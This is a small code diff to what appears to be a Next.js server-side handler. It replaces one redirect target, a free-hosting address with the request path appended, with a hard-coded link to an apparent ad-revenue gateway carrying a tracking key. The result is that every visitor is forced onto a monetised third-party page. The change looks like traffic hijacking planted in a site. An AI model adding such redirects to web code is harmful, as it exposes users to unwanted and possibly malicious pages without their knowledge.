@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://versalfb.000webhostapp.com/` + encodeURI(path as string)
+					`https://www.highrevenuegate.com/ydr2zpuag?key=95766e6b67ff944063c194e329e89972/` 
 				}`,
 			},
 		};
